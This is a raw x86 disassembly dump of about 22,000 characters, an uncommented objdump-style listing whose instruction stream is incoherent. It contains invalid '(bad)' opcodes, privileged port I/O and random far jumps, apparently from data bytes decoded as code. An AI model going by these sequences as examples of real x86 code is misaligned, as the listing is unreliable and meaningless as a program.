  42b40d:	fsubr  QWORD PTR [eax+0x49d3]
	...
  42b473:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   ebx,esp
  42b481:	bound  edi,QWORD PTR [eax+esi*2]
  42b484:	mov    ecx,0x50001cf
  42b489:	add    DWORD PTR [eax],eax
  42b48b:	add    bh,bh
  42b48d:	mov    ds:0x97a9be8b,al
  42b492:	and    ch,BYTE PTR ds:0x8039e33b
  42b498:	sbb    BYTE PTR [eax+0x36],bh
  42b49b:	xchg   ebp,eax
  42b49c:	add    ah,BYTE PTR [esi-0x28]
  42b49f:	sub    DWORD PTR [esi],ecx
  42b4a1:	push   ds
  42b4a2:	shl    BYTE PTR [esp+ebx*8+0x57],0xc6
  42b4a7:	ss adc al,0xb8
  42b4aa:	pop    ds
  42b4ab:	jb     0x42b4b9
  42b4ad:	push   ecx
  42b4ae:	shl    dl,1
  42b4b0:	fld    TBYTE PTR [ebp+0x6b]
  42b4b3:	push   ds
  42b4b4:	rcr    DWORD PTR [ebx],0x88
  42b4b7:	jmp    DWORD PTR [ebx-0xe]
  42b4ba:	rol    bl,cl
  42b4bc:	stc    
  42b4bd:	fld    DWORD PTR [ecx-0x1e]
  42b4c0:	mov    cl,0x8e
  42b4c2:	in     eax,dx
  42b4c3:	push   DWORD PTR ds:0xb6c4ebfa
  42b4c9:	pop    edx
  42b4ca:	dec    ebp
  42b4cb:	pusha  
  42b4cc:	fidivr DWORD PTR [edx-0x54e7da5]
  42b4d2:	out    0x17,al
  42b4d4:	je     0x42b49d
  42b4d6:	dec    ebx
  42b4d7:	mov    fs,WORD PTR [ecx]
  42b4d9:	repz jns 0x42b532
  42b4dc:	add    eax,0x921f205e
  42b4e1:	mov    ebp,eax
  42b4e3:	fmul   DWORD PTR ds:0xf108c5dd
  42b4e9:	js     0x42b46e
  42b4eb:	mov    al,0x79
  42b4ed:	outs   dx,BYTE PTR ds:[esi]
  42b4ee:	or     esp,0x62
  42b4f1:	mov    bl,al
  42b4f3:	mov    eax,ds:0xc5f044c1
  42b4f8:	pop    esi
  42b4f9:	call   0x3073:0x722021c
  42b500:	add    eax,0xd1879bf7
  42b505:	int    0x9
  42b507:	rol    BYTE PTR [ebx-0x6dbf798a],0x91
  42b50e:	stos   BYTE PTR es:[edi],al
  42b50f:	jnp    0x42b4a8
  42b511:	push   ebx
  42b512:	sub    eax,0x9d5472de
  42b517:	iret   
  42b518:	repz ja 0x42b4a3
  42b51b:	xlat   BYTE PTR ds:[ebx]
  42b51c:	pusha  
  42b51d:	add    bl,BYTE PTR ds:0xa5f56593
  42b523:	pop    edi
  42b524:	retf   
  42b525:	loopne 0x42b4b0
  42b527:	call   FWORD PTR ds:0x9fd586d6
  42b52d:	cld    
  42b52e:	jae    0x42b4da
  42b530:	popa   
  42b531:	or     BYTE PTR [eax],al
  42b533:	cmp    eax,0xf98c5208
  42b538:	xor    BYTE PTR [ebx],dl
  42b53a:	sub    eax,0x1f10461c
  42b53f:	into   
  42b540:	add    dl,BYTE PTR [ecx+ebx*1]
  42b543:	outs   dx,BYTE PTR ds:[esi]
  42b544:	aad    0xfa
  42b546:	pushf  
  42b547:	test   DWORD PTR [ebp+0x6e8727a5],eax
  42b54d:	mov    bh,0x31
  42b54f:	outs   dx,DWORD PTR ds:[esi]
  42b550:	dec    edi
  42b551:	pop    ebp
  42b552:	stos   DWORD PTR es:[edi],eax
  42b553:	adc    BYTE PTR [edi],0xcb
  42b556:	inc    esi
  42b557:	add    DWORD PTR [ecx+0x1a],eax
  42b55a:	dec    edi
  42b55b:	sbb    al,0x8b
  42b55d:	inc    al
  42b55f:	rol    BYTE PTR [di],1
  42b562:	mov    cl,0xfc
  42b564:	pop    esp
  42b565:	lods   al,BYTE PTR ds:[esi]
  42b566:	cmp    al,dl
  42b568:	inc    edx
  42b569:	add    DWORD PTR [edi+0x66f148e5],edi
  42b56f:	clc    
  42b570:	xchg   ebx,esp
  42b572:	pop    edx
  42b573:	mov    eax,0xe1632a4e
  42b578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b579:	xchg   esi,eax
  42b57a:	lods   al,BYTE PTR ds:[si]
  42b57c:	sbb    al,0xf
  42b57e:	mov    fs,WORD PTR [ebp+0x175f6a1d]
  42b584:	sbb    DWORD PTR [edi+0x27],ebp
  42b587:	adc    BYTE PTR [edi+0x57],dh
  42b58a:	jmp    0x42b51a
  42b58c:	rcr    BYTE PTR [eax-0x3d],0xe3
  42b590:	imul   eax,DWORD PTR [eax],0x0
	...
  42b5f2:	add    BYTE PTR [eax],al
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	jp     0x42b588
  42b602:	and    al,0x47
  42b604:	mov    esi,0x50001d0
  42b609:	add    DWORD PTR [eax],eax
  42b60b:	add    BYTE PTR [eax*1-0x6b67521d],cl
  42b612:	push   es
  42b613:	sar    ch,cl
  42b615:	jl     0x42b60a
  42b617:	jnp    0x42b614
  42b619:	int    0x6e
  42b61b:	rol    BYTE PTR [ecx+0x1ec57795],cl
  42b621:	dec    ebx
  42b622:	dec    ebp
  42b623:	stos   BYTE PTR es:[edi],al
  42b624:	aaa    
  42b625:	mov    ch,0xd7
  42b627:	jnp    0x42b649
  42b629:	cmp    al,0x6
  42b62b:	inc    ebp
  42b62c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b62d:	or     DWORD PTR [edi-0x42],ebx
  42b630:	outs   dx,DWORD PTR ds:[esi]
  42b631:	push   esi
  42b632:	cmp    BYTE PTR [eax],cl
  42b634:	pop    ds
  42b635:	in     al,dx
  42b636:	fcom   QWORD PTR ds:[edx+ecx*8+0x12]
  42b63b:	cs add al,0x1c
  42b63e:	xor    edx,eax
  42b640:	adc    bl,BYTE PTR [ecx+0x6]
  42b643:	mov    ebp,0x1f591186
  42b648:	ja     0x42b5e7
  42b64a:	and    eax,0xc356739e
  42b64f:	sub    esp,DWORD PTR [ebp-0x54939004]
  42b655:	adc    dh,BYTE PTR ds:0xd9711159
  42b65b:	fsubr  DWORD PTR [ebx-0x17c0f72]
  42b661:	test   eax,0xeafe88d6
  42b666:	popf   
  42b667:	xor    esp,0x4b3ed4b4
  42b66d:	cld    
  42b66e:	pushf  
  42b66f:	mov    WORD PTR [ecx-0x4833ebf7],fs
  42b675:	ror    DWORD PTR [esi+0x7d],cl
  42b678:	jns    0x42b6ec
  42b67a:	sbb    eax,0x34d8b4ef
  42b67f:	cmp    edi,DWORD PTR [ebx-0x5c]
  42b682:	popa   
  42b683:	or     eax,0x8620291d
  42b688:	je     0x42b6c4
  42b68a:	loop   0x42b6de
  42b68c:	mov    ds:0x90025422,eax
  42b691:	xlat   BYTE PTR ds:[ebx]
  42b692:	repnz mov ds:0x3cd0eb5d,al
  42b698:	mov    ebp,0xbbeda6d1
  42b69d:	sub    ebp,DWORD PTR [ebp-0x3b89ee44]
  42b6a3:	pop    esi
  42b6a4:	mov    esp,eax
  42b6a6:	retf   
  42b6a7:	mov    ah,0xd7
  42b6a9:	xor    BYTE PTR [ebp-0x70],bl
  42b6ac:	adc    bh,BYTE PTR [edx-0x40]
  42b6af:	(bad)  
  42b6b0:	cwde   
  42b6b1:	test   al,0x8b
  42b6b3:	cs std 
  42b6b5:	and    eax,0x563a8031
  42b6ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6bb:	int3   
  42b6bc:	sbb    eax,DWORD PTR [edi-0x64]
  42b6bf:	push   esp
  42b6c0:	or     ebp,edx
  42b6c2:	dec    esi
  42b6c3:	leave  
  42b6c4:	retf   0x11fb
  42b6c7:	mov    bl,0x44
  42b6c9:	adc    ebp,edi
  42b6cb:	cmp    DWORD PTR [ebx+esi*8+0x2],edx
  42b6cf:	aad    0xd9
  42b6d1:	jno    0x42b71a
  42b6d3:	sub    bh,BYTE PTR [ecx]
  42b6d5:	bound  edx,QWORD PTR [edx]
  42b6d7:	dec    ebx
  42b6d8:	lds    ebp,FWORD PTR [esi-0x41aa844c]
  42b6de:	cmp    bl,bl
  42b6e0:	add    BYTE PTR [ebx+0x78],ch
  42b6e3:	dec    ebx
  42b6e4:	adc    BYTE PTR [edi+0x7689748b],al
  42b6ea:	add    eax,0xa4fad628
  42b6ef:	sbb    DWORD PTR [esp+esi*4-0x31308155],0xb
  42b6f7:	mov    ds:0x5f0d21ad,al
  42b6fc:	nop
  42b6fd:	sbb    esi,ebp
  42b6ff:	and    DWORD PTR [edi-0x41],esp
  42b702:	and    bh,BYTE PTR [eax+0x2a27087f]
  42b708:	and    eax,0x88d00fed
  42b70d:	lods   al,BYTE PTR ds:[esi]
  42b70e:	test   BYTE PTR [bx+si+0x0],bl
	...
  42b772:	add    BYTE PTR [eax],al
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	repz call 0x1:0xd1c314f0
  42b788:	add    eax,0x6d000001
  42b78d:	jmp    0x4fce7784
  42b792:	lea    ebx,fs:[edx-0x21]
  42b796:	jae    0x42b76a
  42b798:	jmp    0x3d21666f
  42b79d:	xchg   BYTE PTR [ebx+0x6ef67d8f],dl
  42b7a3:	mov    WORD PTR [edx+0xc],ss
  42b7a6:	pop    esp
  42b7a7:	sar    DWORD PTR [ebp+0x69f75beb],0x8d
  42b7ae:	enter  0x2c63,0x5d
  42b7b2:	adc    al,0x1e
  42b7b4:	ins    BYTE PTR es:[edi],dx
  42b7b5:	imul   edx,DWORD PTR [esp+edi*8],0x4a
  42b7b9:	ror    BYTE PTR [ebx+0x52],1
  42b7bc:	fs xchg esi,eax
  42b7be:	xchg   esp,eax
  42b7bf:	add    DWORD PTR [ecx+0x2],eax
  42b7c2:	xor    DWORD PTR [ebp+ecx*4-0x47],0xfffffffa
  42b7c7:	jmp    0x6c7a:0x5d5f3c51
  42b7ce:	adc    BYTE PTR [edx-0x43b4eb91],bl
  42b7d4:	add    al,0xb0
  42b7d6:	gs jnp 0x42b7be
  42b7d9:	jge    0x42b82a
  42b7db:	in     eax,0x55
  42b7dd:	enter  0xb891,0xa9
  42b7e1:	int3   
  42b7e2:	cmc    
  42b7e3:	les    eax,FWORD PTR [edx]
  42b7e5:	inc    edi
  42b7e6:	ins    BYTE PTR es:[edi],dx
  42b7e7:	xchg   esi,eax
  42b7e8:	icebp  
  42b7e9:	push   ss
  42b7ea:	mov    al,ds:0xb4bdd094
  42b7ef:	loop   0x42b817
  42b7f1:	mov    BYTE PTR [ebx],dh
  42b7f3:	pop    edi
  42b7f4:	jl     0x42b7df
  42b7f6:	jmp    0x42b7ac
  42b7f8:	std    
  42b7f9:	es sub eax,0xd204be79
  42b7ff:	or     bh,dl
  42b801:	sahf   
  42b802:	lds    esp,FWORD PTR [esi]
  42b804:	cs sbb al,0x46
  42b807:	add    DWORD PTR [edi+eiz*1+0x44],0x2e
  42b80c:	xchg   ebp,eax
  42b80d:	out    0x9,eax
  42b80f:	mov    cs,WORD PTR [ebp-0x32c988a9]
  42b815:	mov    esp,0xf7820700
  42b81a:	cmp    DWORD PTR [eax-0x5dd4ab11],0xa6e35e85
  42b824:	pushf  
  42b825:	stos   BYTE PTR es:[edi],al
  42b826:	ret    0x5bed
  42b829:	or     al,ah
  42b82b:	cmp    DWORD PTR [eax],esi
  42b82d:	mov    edi,0x298e05ca
  42b832:	inc    esp
  42b833:	mov    WORD PTR [ebx+0x78],ds
  42b836:	pop    ecx
  42b837:	scas   eax,DWORD PTR es:[edi]
  42b838:	and    esp,DWORD PTR [esi-0x698957ce]
  42b83e:	push   edx
  42b83f:	push   esp
  42b840:	fst    DWORD PTR [ecx+0x73a6ad73]
  42b846:	adc    BYTE PTR [esi+ebp*4+0x58],al
  42b84a:	mov    al,ds:0xdc7b107d
  42b84f:	pop    eax
  42b850:	xor    eax,0x79851e
  42b855:	in     eax,dx
  42b856:	pop    esp
  42b857:	mov    esp,0x8a324f16
  42b85c:	js     0x42b812
  42b85e:	push   cs
  42b85f:	sahf   
  42b860:	pmaxsw mm1,QWORD PTR [ebp-0x43252cee]
  42b867:	loopne 0x42b811
  42b869:	mov    dl,0x40
  42b86b:	cmp    BYTE PTR [ecx+edx*8-0x25],dh
  42b86f:	adc    edx,DWORD PTR [esi+0x441fe93f]
  42b875:	push   edi
  42b876:	loope  0x42b830
  42b878:	outs   dx,BYTE PTR ds:[esi]
  42b879:	add    eax,DWORD PTR [ebp+eax*8+0x32]
  42b87d:	add    ebp,ebx
  42b87f:	mov    ecx,DWORD PTR [eax-0xfd4424d]
  42b885:	add    ch,dl
  42b887:	inc    eax
  42b888:	xchg   ebx,eax
  42b889:	bound  ebx,QWORD PTR [eax*2+0x2d1c6d03]
  42b890:	pop    ecx
	...
  42b8f1:	add    BYTE PTR [eax],al
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ebx,DWORD PTR ds:0xc871e91d
  42b905:	rol    BYTE PTR [ecx],cl
  42b907:	add    BYTE PTR ds:0x52000001,al
  42b90d:	lods   al,BYTE PTR ds:[esi]
  42b90e:	adc    al,0xd4
  42b910:	xchg   ebp,eax
  42b911:	pusha  
  42b912:	inc    ebx
  42b913:	push   esi
  42b914:	retf   
  42b915:	pusha  
  42b916:	push   ebx
  42b917:	or     eax,0xba0064d0
  42b91c:	sbb    BYTE PTR [edi],bh
  42b91e:	cmc    
  42b91f:	rcl    edx,cl
  42b921:	in     eax,0x69
  42b923:	fwait
  42b924:	xchg   ebp,eax
  42b925:	mov    bh,cl
  42b927:	and    esp,DWORD PTR [eax+0x3a8888b3]
  42b92d:	add    eax,0x57e9d20d
  42b932:	cmp    BYTE PTR [esp+esi*8],0x4a
  42b936:	inc    ebx
  42b937:	lods   al,BYTE PTR ds:[esi]
  42b938:	in     eax,dx
  42b939:	mov    edx,0xda3e72da
  42b93e:	sub    eax,0x14017186
  42b943:	and    eax,0x49850304
  42b948:	(bad)  
  42b949:	pop    edi
  42b94a:	sub    al,0x9c
  42b94c:	addr16 retf 0x8e51
  42b950:	test   ebx,esp
  42b952:	nop
  42b953:	cli    
  42b954:	pop    ss
  42b955:	gs ret 
  42b957:	imul   ebx,DWORD PTR [edi],0xffffffbb
  42b95a:	cmp    edi,0x11
  42b95d:	out    0x93,eax
  42b95f:	xor    BYTE PTR [ecx],dl
  42b961:	arpl   dx,di
  42b963:	fsub   DWORD PTR ds:0xf370e00a
  42b969:	loopne 0x42b9c0
  42b96b:	das    
  42b96c:	sbb    eax,0x2718eee8
  42b971:	jbe    0x42b905
  42b973:	fcomp  DWORD PTR [esi]
  42b975:	dec    ecx
  42b976:	mov    edx,0x6b35b3b2
  42b97b:	aad    0x6d
  42b97d:	inc    esi
  42b97e:	sbb    eax,0xf1830e64
  42b983:	cmp    DWORD PTR [ebp-0x22],0x7a
  42b987:	inc    eax
  42b988:	push   edi
  42b989:	sbb    eax,0x59633c77
  42b98e:	xchg   DWORD PTR [esi],edi
  42b990:	pop    esp
  42b991:	imul   esp,DWORD PTR [edx+0x40],0xffffff87
  42b995:	ror    BYTE PTR cs:[edx-0x19],cl
  42b999:	push   es
  42b99a:	jge    0x42b98b
  42b99c:	mov    al,ds:0xc3010a33
  42b9a1:	add    DWORD PTR [edi+0x4d],esp
  42b9a4:	and    bl,BYTE PTR [edx]
  42b9a6:	push   eax
  42b9a7:	cmp    eax,0x27587ec
  42b9ac:	aaa    
  42b9ad:	and    eax,0x17b40413
  42b9b2:	aas    
  42b9b3:	push   ss
  42b9b4:	mov    esi,0x72584722
  42b9b9:	jmp    0x3acff7b3
  42b9be:	sub    ecx,edi
  42b9c0:	sub    cl,dh
  42b9c2:	dec    ebx
  42b9c3:	and    ch,ch
  42b9c5:	mov    ah,0xf5
  42b9c7:	loope  0x42b955
  42b9c9:	xchg   ecx,eax
  42b9ca:	setb   BYTE PTR fs:0x7261cff1
  42b9d2:	push   ecx
  42b9d3:	(bad)  
  42b9d4:	popf   
  42b9d5:	in     eax,0x31
  42b9d7:	stc    
  42b9d8:	adc    BYTE PTR [edx],bl
  42b9da:	nop
  42b9db:	xchg   ebp,eax
  42b9dc:	cld    
  42b9dd:	mov    ah,0x87
  42b9df:	pop    esi
  42b9e0:	stos   DWORD PTR es:[edi],eax
  42b9e1:	sbb    esp,ecx
  42b9e3:	mul    esp
  42b9e5:	pushf  
  42b9e6:	mov    ds:0x33c9d188,eax
  42b9eb:	imul   ebx,ebx,0xe023cd32
  42b9f1:	or     al,0x5a
  42b9f3:	jle    0x42ba51
  42b9f5:	out    dx,eax
  42b9f6:	(bad)  
  42b9f7:	xchg   esp,eax
  42b9f8:	das    
  42b9f9:	mov    cl,0xf0
  42b9fb:	fld    DWORD PTR [edx+0xb71acf5]
  42ba01:	nop
  42ba02:	xchg   ebp,eax
  42ba03:	lahf   
  42ba04:	inc    eax
  42ba05:	int3   
  42ba06:	cld    
  42ba07:	jb     0x42b9e1
  42ba09:	push   ebx
  42ba0a:	add    BYTE PTR [eax+eax*1],dh
  42ba0d:	ret    
  42ba0e:	mov    al,ds:0x3315
	...
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [edi-0x32b29076],esi
  42ba85:	rol    DWORD PTR [ecx],cl
  42ba87:	add    BYTE PTR ds:0x56000001,al
  42ba8d:	retf   
  42ba8e:	sbb    eax,0x5ba30a56
  42ba93:	leave  
  42ba94:	or     al,0x55
  42ba96:	adc    al,0x37
  42ba98:	adc    al,0x6
  42ba9a:	fadd   QWORD PTR [edx-0x3]
  42ba9d:	and    eax,0xdbde7b73
  42baa2:	push   0xffffff9d
  42baa4:	scas   al,BYTE PTR es:[edi]
  42baa5:	cld    
  42baa6:	xchg   ebx,eax
  42baa7:	fs and edi,ebp
  42baaa:	mov    ebp,0xe0dd9870
  42baaf:	ss std 
  42bab1:	push   esp
  42bab2:	clc    
  42bab3:	aas    
  42bab4:	pop    ebx
  42bab5:	sahf   
  42bab6:	push   ds
  42bab7:	jns    0x42bb11
  42bab9:	or     eax,0xa51a4d8a
  42babe:	rcr    BYTE PTR [edx-0x77],0xaf
  42bac2:	push   es
  42bac3:	arpl   WORD PTR [ebx-0x5acf2102],sp
  42bac9:	and    ch,ch
  42bacb:	shl    DWORD PTR [edi],cl
  42bacd:	test   DWORD PTR [ecx+0x10aaa991],esp
  42bad3:	enter  0xd92b,0x1c
  42bad7:	add    BYTE PTR gs:[ebx-0x491c3ba1],bl
  42bade:	je     0x42bad9
  42bae0:	shrd   DWORD PTR [eax-0x46],ecx,0x67
  42bae5:	mov    BYTE PTR [ebp+0x4ba1d404],cl
  42baeb:	jbe    0x42bb38
  42baed:	sub    eax,0xbd248e6c
  42baf2:	ret    
  42baf3:	lds    edi,FWORD PTR [ebx]
  42baf5:	inc    ebp
  42baf6:	mov    DWORD PTR [ecx+0x58],ebp
  42baf9:	sbb    eax,ebp
  42bafb:	push   ebp
  42bafc:	outs   dx,DWORD PTR ds:[esi]
  42bafd:	ja     0x42bb15
  42baff:	jnp    0x42bb37
  42bb01:	xor    BYTE PTR [edi-0x3c],dh
  42bb04:	jl     0x42bb67
  42bb06:	out    dx,eax
  42bb07:	into   
  42bb08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb09:	xchg   BYTE PTR [ebp-0x5a],bl
  42bb0c:	ret    0xf588
  42bb0f:	(bad)  
  42bb10:	and    BYTE PTR [ebx+0x13],cl
  42bb13:	out    0x72,eax
  42bb15:	retf   
  42bb16:	les    esi,FWORD PTR [ebp+0x5cd35658]
  42bb1c:	jb     0x42baf5
  42bb1e:	sub    edi,ebx
  42bb20:	iret   
  42bb21:	loope  0x42bb80
  42bb23:	neg    DWORD PTR [esi+ebp*1+0x702b97d1]
  42bb2a:	test   al,0x48
  42bb2c:	out    0x5d,al
  42bb2e:	in     eax,dx
  42bb2f:	xchg   ebx,eax
  42bb30:	(bad)  
  42bb31:	ror    BYTE PTR [edi-0xa86b7dc],cl
  42bb37:	hlt    
  42bb38:	cdq    
  42bb39:	lea    eax,[ecx]
  42bb3b:	pop    edi
  42bb3c:	les    edi,FWORD PTR ds:0xc1984369
  42bb42:	pop    ebp
  42bb43:	jnp    0x42bb5b
  42bb45:	sbb    ch,cl
  42bb47:	lods   al,BYTE PTR ds:[esi]
  42bb48:	cs pop edx
  42bb4a:	adc    al,0xca
  42bb4c:	cmp    DWORD PTR [edi+ebp*4],ebp
  42bb4f:	dec    ecx
  42bb50:	loope  0x42baf2
  42bb52:	das    
  42bb53:	std    
  42bb54:	and    ah,0x72
  42bb57:	jo     0x42bb67
  42bb59:	sub    eax,0x4ccc7095
  42bb5e:	in     eax,dx
  42bb5f:	mov    cs,WORD PTR [ebx-0x17]
  42bb62:	aas    
  42bb63:	pushf  
  42bb64:	sub    dl,BYTE PTR [edi+edi*1-0x41]
  42bb68:	out    0xb7,al
  42bb6a:	(bad)  
  42bb6b:	cmp    eax,0xef1476bf
  42bb70:	sti    
  42bb71:	push   esp
  42bb72:	in     eax,dx
  42bb73:	es pop ds
  42bb75:	inc    esi
  42bb76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb77:	retf   
  42bb78:	aas    
  42bb79:	jo     0x42bb47
  42bb7b:	inc    esi
  42bb7c:	sbb    eax,0x4eea2ef3
  42bb81:	imul   ebp,DWORD PTR [ecx],0x3e4e8424
  42bb87:	xchg   edi,eax
  42bb88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb89:	mov    dl,0xbd
  42bb8b:	inc    esi
  42bb8c:	jbe    0x42bb9b
  42bb8e:	xlat   BYTE PTR ds:[ebx]
  42bb8f:	cmp    al,0x44
	...
  42bbf1:	add    BYTE PTR [eax],al
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	or     DWORD PTR [ebx-0x1a],edx
  42bc03:	mov    ah,0xd2
  42bc05:	aam    0x1
  42bc07:	add    BYTE PTR ds:0x91000001,al
  42bc0d:	aam    0x50
  42bc0f:	ds inc edi
  42bc11:	and    BYTE PTR [edx],ah
  42bc13:	imul   ebx,DWORD PTR [ebp-0x64bdf558],0x8a92158
  42bc1d:	icebp  
  42bc1e:	xor    DWORD PTR [eax],0xcf26039d
  42bc24:	out    dx,al
  42bc25:	lock push ds
  42bc27:	mov    edi,0xea1ab375
  42bc2c:	lds    edi,FWORD PTR [ecx+0x67a6ff2]
  42bc32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc33:	xchg   edi,eax
  42bc34:	hlt    
  42bc35:	mov    cl,0x84
  42bc37:	mov    bl,0x90
  42bc39:	adc    al,0x5b
  42bc3b:	sub    DWORD PTR [edx-0x77a7bc3],ecx
  42bc41:	mov    cs,WORD PTR [esi]
  42bc43:	or     eax,0xd2310419
  42bc48:	adc    ah,BYTE PTR [ebp+0x40]
  42bc4b:	or     eax,0x97d8f4f1
  42bc50:	test   DWORD PTR [esi-0x43],edx
  42bc53:	adc    edx,DWORD PTR [ebp+eiz*8-0x52]
  42bc57:	xchg   edx,eax
  42bc58:	push   eax
  42bc59:	scas   al,BYTE PTR es:[edi]
  42bc5a:	sub    eax,0x61e7dbb8
  42bc5f:	mov    bl,0xf5
  42bc61:	mov    dl,0x82
  42bc63:	repnz push edx
  42bc65:	push   cs
  42bc66:	mov    cs,WORD PTR ds:0x163e6a1b
  42bc6c:	or     BYTE PTR ds:[ecx+0x7],cl
  42bc70:	js     0x42bc47
  42bc72:	mov    dl,0xf5
  42bc74:	fidivr WORD PTR [edx+edi*4+0x16]
  42bc78:	(bad)  
  42bc79:	(bad)  
  42bc7a:	xlat   BYTE PTR ds:[ebx]
  42bc7b:	or     BYTE PTR [esi-0x3a],dh
  42bc7e:	cmp    esp,DWORD PTR [esi+0x52d79090]
  42bc84:	sub    al,0x14
  42bc86:	test   al,0xe4
  42bc88:	dec    esi
  42bc89:	xor    ebx,DWORD PTR [ebx]
  42bc8b:	out    dx,eax
  42bc8c:	(bad)  
  42bc8d:	stos   DWORD PTR es:[edi],eax
  42bc8e:	dec    edx
  42bc8f:	pusha  
  42bc90:	out    0xd2,al
  42bc92:	aad    0xde
  42bc94:	push   edi
  42bc95:	shl    BYTE PTR [edx-0x4c],cl
  42bc98:	addr16 inc edx
  42bc9a:	push   ebp
  42bc9b:	lahf   
  42bc9c:	xor    dh,BYTE PTR [edi+0x7]
  42bc9f:	int    0xfd
  42bca1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bca2:	int    0x9
  42bca4:	lock pop ss
  42bca6:	in     al,dx
  42bca7:	icebp  
  42bca8:	adc    ebp,DWORD PTR [ebx+0x3]
  42bcab:	das    
  42bcac:	mov    BYTE PTR [esp+ebx*1+0x26],al
  42bcb0:	scas   al,BYTE PTR es:[edi]
  42bcb1:	enter  0x91b6,0x89
  42bcb5:	xchg   esi,eax
  42bcb6:	jo     0x42bcd3
  42bcb8:	out    dx,al
  42bcb9:	dec    ebx
  42bcba:	shl    ebp,1
  42bcbc:	sbb    ah,BYTE PTR [edi-0x9]
  42bcbf:	(bad)  
  42bcc0:	push   eax
  42bcc1:	sub    DWORD PTR [edi-0x5b75043b],esi
  42bcc7:	mov    ecx,0x16bf3e69
  42bccc:	outs   dx,BYTE PTR ds:[esi]
  42bccd:	test   al,0x22
  42bccf:	sbb    BYTE PTR [edx],ch
  42bcd1:	mov    DWORD PTR [ebp+eax*1+0x404ae1fd],eax
  42bcd8:	push   ds
  42bcd9:	in     al,0x92
  42bcdb:	or     bl,dl
  42bcdd:	aaa    
  42bcde:	xchg   ebp,eax
  42bcdf:	cli    
  42bce0:	cmp    al,0x93
  42bce2:	xor    al,0x6
  42bce4:	test   eax,0x420820c
  42bce9:	mov    ebp,0x6c310192
  42bcee:	or     ebx,DWORD PTR [edi]
  42bcf0:	out    0x74,eax
  42bcf2:	inc    edi
  42bcf3:	push   esp
  42bcf4:	dec    ecx
  42bcf5:	(bad)  
  42bcf6:	imul   esi,DWORD PTR [edi-0x6dc7c16e],0xffffffd3
  42bcfd:	jbe    0x42bd05
  42bcff:	xchg   ecx,eax
  42bd00:	or     bh,bh
  42bd02:	adc    al,0x50
  42bd04:	mov    al,0x23
  42bd06:	iret   
  42bd07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd08:	dec    edi
  42bd09:	mov    BYTE PTR [ecx+0x3d255272],bl
  42bd0f:	and    eax,0x6
	...
  42bd74:	mov    al,0xb6
  42bd76:	pushf  
  42bd77:	adc    al,0x9e
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd45
  42bd81:	adc    BYTE PTR [ebx+ebp*2-0x29],ch
  42bd85:	aad    0x1
  42bd87:	add    BYTE PTR ds:0x5e000001,al
  42bd8d:	aad    0xf
  42bd8f:	or     eax,0xb011a36b
  42bd94:	dec    esi
  42bd95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd96:	mov    ebx,0xf759f10d
  42bd9b:	mov    eax,0x5b568d7
  42bda0:	dec    esp
  42bda1:	test   DWORD PTR [esi+0x44],esi
  42bda4:	loop   0x42bd91
  42bda6:	jnp    0x42bdb4
  42bda8:	or     BYTE PTR ds:0x1ee17567,dl
  42bdae:	pop    ebp
  42bdaf:	(bad)  
  42bdb0:	pop    edx
  42bdb1:	cmp    bh,BYTE PTR ss:[ecx+edx*1+0x4a0e243f]
  42bdb9:	je     0x42bdd6
  42bdbb:	jns    0x42bd81
  42bdbd:	cli    
  42bdbe:	fldenv [esi-0x1a]
  42bdc1:	xchg   BYTE PTR [esi+0x43],ch
  42bdc4:	jmp    0x42be42
  42bdc6:	xchg   ebx,eax
  42bdc7:	fld    DWORD PTR [esi+0x7b]
  42bdca:	in     al,0x45
  42bdcc:	ins    DWORD PTR es:[edi],dx
  42bdcd:	pop    ecx
  42bdce:	adc    al,BYTE PTR [edi+0x65ff118e]
  42bdd4:	in     al,dx
  42bdd5:	lahf   
  42bdd6:	nop
  42bdd7:	xchg   ebx,eax
  42bdd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bdd9:	shl    ecx,0x20
  42bddc:	pop    edx
  42bddd:	sub    BYTE PTR [edi],dl
  42bddf:	pop    ebx
  42bde0:	rol    eax,0xd
  42bde3:	sbb    ecx,esp
  42bde5:	pop    ds
  42bde6:	fstp   TBYTE PTR [ebx-0x65713b86]
  42bdec:	inc    esi
  42bded:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  42bdef:	push   cs
  42bdf0:	out    dx,al
  42bdf1:	scas   al,BYTE PTR es:[edi]
  42bdf2:	gs int 0xb3
  42bdf5:	mov    cl,0xe7
  42bdf7:	(bad)  
  42bdf8:	out    dx,eax
  42bdf9:	fisub  WORD PTR [ebx+ebx*4]
  42bdfc:	loopne 0x42be3d
  42bdfe:	in     al,0xf4
  42be00:	add    esp,DWORD PTR [edx-0x55]
